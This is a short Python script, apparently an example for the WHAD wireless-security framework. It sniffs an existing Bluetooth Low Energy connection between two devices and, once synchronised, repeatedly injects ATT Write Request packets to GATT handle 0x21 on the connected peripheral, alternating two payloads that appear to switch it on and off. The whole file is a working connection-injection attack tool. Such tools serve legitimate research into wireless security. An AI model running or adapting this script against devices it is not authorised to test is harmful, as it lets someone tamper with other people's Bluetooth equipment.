from whad.ble import Sniffer, Injector
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
import sys

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            sniffer = Sniffer(dev)
            sniffer.configure(advertisements=False, connection=True)
            sniffer.start()
            while not sniffer.is_synchronized():
                sleep(1)
            print("Press enter to inject.")
            input()
            injector = sniffer.available_actions(Injector)[0]
            while True:
                a = injector.inject_to_slave(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a"))
                print(a)
                print("Press enter to inject.")
                input()
                a = injector.inject_to_slave(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a"))
                print(a)
                print("Press enter to inject.")
                input()
        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
